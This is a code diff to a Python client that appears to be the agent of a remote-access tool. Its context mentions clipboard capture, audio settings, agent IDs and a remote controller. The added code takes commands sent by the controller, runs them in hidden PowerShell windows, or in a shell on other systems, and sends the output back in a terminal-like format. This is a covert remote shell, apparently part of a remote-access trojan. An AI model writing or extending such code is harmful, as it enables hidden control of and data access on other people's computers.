@@ -5730,6 +5730,192 @@ LAST_CLIPBOARD_CONTENT = ""
 # --- Audio Config ---
 # Note: Audio constants are defined globally above
 
+# ============================================================================
+# PowerShell Terminal Formatting for UI v2.1
+# ============================================================================
+
+def get_powershell_prompt():
+    """Get PowerShell-style prompt with current directory."""
+    try:
+        cwd = os.getcwd()
+        # PowerShell shows full path
+        return f"PS {cwd}>"
+    except:
+        return "PS C:\\>"
+
+def get_powershell_version():
+    """Get PowerShell version information."""
+    try:
+        if platform.system() == "Windows":
+            ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            result = subprocess.run(
+                [ps_exe, "-NoProfile", "-Command", "$PSVersionTable.PSVersion.ToString()"],
+                capture_output=True,
+                text=True,
+                timeout=5,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            return result.stdout.strip() or "5.1"
+    except:
+        pass
+    return "5.1"
+
+def format_powershell_output(command, stdout, stderr="", exit_code=0, execution_time=0):
+    """
+    Format command output to look EXACTLY like PowerShell terminal.
+    
+    Returns a dict with PowerShell-specific formatting for UI v2.1:
+    - prompt: PowerShell prompt string
+    - command: The command that was executed
+    - output: Command output
+    - error: Error output (if any)
+    - exit_code: Command exit code
+    - cwd: Current working directory
+    - execution_time: Command execution time in ms
+    - terminal_type: 'powershell'
+    - ps_version: PowerShell version
+    """
+    prompt = get_powershell_prompt()
+    
+    # Format output exactly like PowerShell
+    formatted_output = {
+        'terminal_type': 'powershell',
+        'prompt': prompt,
+        'command': command,
+        'output': stdout.strip() if stdout else '',
+        'error': stderr.strip() if stderr else '',
+        'exit_code': exit_code,
+        'cwd': os.getcwd() if hasattr(os, 'getcwd') else 'C:\\',
+        'execution_time': execution_time,
+        'ps_version': get_powershell_version(),
+        'timestamp': int(time.time() * 1000),
+        'formatted_text': build_powershell_text(prompt, command, stdout, stderr, exit_code)
+    }
+    
+    return formatted_output
+
+def build_powershell_text(prompt, command, stdout, stderr, exit_code):
+    """Build the actual text output that looks like PowerShell."""
+    lines = []
+    
+    # Add prompt + command
+    lines.append(f"{prompt} {command}")
+    
+    # Add output
+    if stdout and stdout.strip():
+        lines.append(stdout.strip())
+    
+    # Add error (PowerShell shows errors in red, but we'll indicate with prefix)
+    if stderr and stderr.strip():
+        # PowerShell error format
+        error_lines = stderr.strip().split('\n')
+        for error_line in error_lines:
+            if error_line.strip():
+                lines.append(error_line)
+    
+    # Add exit code if non-zero
+    if exit_code != 0:
+        lines.append(f"Exit code: {exit_code}")
+    
+    # Add trailing prompt (ready for next command)
+    lines.append(f"{prompt} ")
+    
+    return '\n'.join(lines)
+
+def execute_in_powershell(command, timeout=30):
+    """
+    Execute command in PowerShell and return formatted output.
+    This is used by execute_command() to ensure all commands use PowerShell.
+    """
+    import time as time_module
+    start_time = time_module.time()
+    
+    try:
+        if platform.system() == "Windows":
+            ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                      'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            
+            # PowerShell execution with proper formatting
+            # Use Out-String -Width 200 to preserve formatting
+            formatted_command = f"{command} | Out-String -Width 200"
+            
+            result = subprocess.run(
+                [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", formatted_command],
+                capture_output=True,
+                text=False,
+                timeout=timeout,
+                creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0,
+                env=os.environ.copy()
+            )
+            
+            # Decode output
+            try:
+                stdout = result.stdout.decode('utf-8', errors='replace')
+                stderr = result.stderr.decode('utf-8', errors='replace')
+            except:
+                import locale
+                encoding = locale.getpreferredencoding() or 'cp437'
+                stdout = result.stdout.decode(encoding, errors='replace')
+                stderr = result.stderr.decode(encoding, errors='replace')
+            
+            execution_time = int((time_module.time() - start_time) * 1000)
+            
+            return format_powershell_output(
+                command=command,
+                stdout=stdout,
+                stderr=stderr,
+                exit_code=result.returncode,
+                execution_time=execution_time
+            )
+        else:
+            # For non-Windows, use bash but format similarly
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+            
+            execution_time = int((time_module.time() - start_time) * 1000)
+            
+            # Return similar format but with bash indicator
+            return {
+                'terminal_type': 'bash',
+                'prompt': f"{os.getenv('USER')}@{socket.gethostname()}:~$",
+                'command': command,
+                'output': result.stdout.strip(),
+                'error': result.stderr.strip(),
+                'exit_code': result.returncode,
+                'cwd': os.getcwd(),
+                'execution_time': execution_time,
+                'timestamp': int(time_module.time() * 1000),
+                'formatted_text': f"$ {command}\n{result.stdout.strip()}"
+            }
+            
+    except subprocess.TimeoutExpired:
+        execution_time = int((time_module.time() - start_time) * 1000)
+        return format_powershell_output(
+            command=command,
+            stdout='',
+            stderr=f'Command timed out after {timeout} seconds',
+            exit_code=1,
+            execution_time=execution_time
+        )
+    except Exception as e:
+        execution_time = int((time_module.time() - start_time) * 1000)
+        return format_powershell_output(
+            command=command,
+            stdout='',
+            stderr=f'Execution error: {str(e)}',
+            exit_code=1,
+            execution_time=execution_time
+        )
+
+# ============================================================================
+# End PowerShell Terminal Formatting
+# ============================================================================
 
 def get_local_ip():
     """Get local IP address."""
@@ -8864,7 +9050,12 @@ def format_command_output(output):
     return formatted
 
 def execute_command(command):
-    """Execute a command and return its output - SMART AUTO-DETECTION with PRESERVED FORMATTING"""
+    """Execute a command in PowerShell and return formatted output for UI v2.1"""
+    # Use the new PowerShell formatting for UI v2.1
+    return execute_in_powershell(command)
+    
+def execute_command_legacy(command):
+    """Legacy execute command function (kept for reference)"""
     try:
         log_message(f"[PS] Executing: {command}", "info")
         
@@ -11924,7 +12115,22 @@ def on_command(data):
             output = execute_command(command)
         
         if output:
-            safe_emit('command_result', {'agent_id': agent_id, 'output': output})
+            # For UI v2.1: Send PowerShell-formatted output
+            if isinstance(output, dict) and 'terminal_type' in output:
+                # Already formatted by execute_in_powershell
+                safe_emit('command_result', {
+                    'agent_id': agent_id,
+                    **output  # Spread PowerShell formatting data
+                })
+            else:
+                # Legacy format (plain string output)
+                safe_emit('command_result', {
+                    'agent_id': agent_id,
+                    'output': output,
+                    'terminal_type': 'legacy',
+                    'prompt': get_powershell_prompt(),
+                    'timestamp': int(time.time() * 1000)
+                })
     
     # Start execution thread (daemon, won't block)
     execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
@@ -11991,14 +12197,27 @@ def on_execute_command(data):
         
         # Send output back to controller WITH execution_id
         log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
-        safe_emit('command_result', {
-            'agent_id': our_agent_id,
-            'execution_id': execution_id,
-            'command': command,
-            'output': output,
-            'success': success,
-            'timestamp': time.time()
-        })
+        # For UI v2.1: Send PowerShell-formatted output
+        if isinstance(output, dict) and 'terminal_type' in output:
+            # Already formatted by execute_in_powershell
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'success': success,
+                **output  # Spread PowerShell formatting data
+            })
+        else:
+            # Legacy format
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'command': command,
+                'output': output,
+                'success': success,
+                'terminal_type': 'legacy',
+                'prompt': get_powershell_prompt(),
+                'timestamp': int(time.time() * 1000)
+            })
     
     # Start execution in background thread (daemon, won't block)
     execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
